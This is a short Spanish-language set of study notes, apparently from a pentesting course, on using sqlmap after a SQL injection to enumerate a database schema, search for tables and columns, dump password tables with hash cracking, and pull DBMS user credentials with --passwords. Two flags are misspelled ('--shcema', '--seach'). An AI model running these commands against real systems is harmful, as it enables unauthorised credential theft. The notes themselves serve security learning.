
## Enumeracion del esquema de la BBDD

Si queremos recuperar la estructura de todas las tablas para tener una vision completa usamos --shcema

```
sqlmap -u URL --schema
```

## Busqueda de datos

Con --seach podemos buscar por nombres 

- Buscar tablas

```
sqlmap -u URL --seach -T 'ALGO'
```
![[Pasted image 20260714134203.png]]

- Buscar columnas

```
sqlmap -u URL --search -C 'ALGO'
```
![[Pasted image 20260714134240.png]]

## Enumeracion y cracking de contraseñas

Una vez que encontramos la tabla que contiene las contraseñas la podemos recuperar como vimos antes

```
sqlmap -u URL -D BBDD -T TABLA --dump
```

Con esto si encuentra hashes intentara crackearlos

## Enumeracion y cracking de contraseñas de usuarios de la BBDD

Ademas de las credenciales que se encuentran en tablas de BBDD podemos volvar el contenido de las tablas del propio sistema que contienen credenciales de la BBDD con --passwords (ej. Credenciales de conexion)

```
sqlmap -u URL --passwords --batch
```
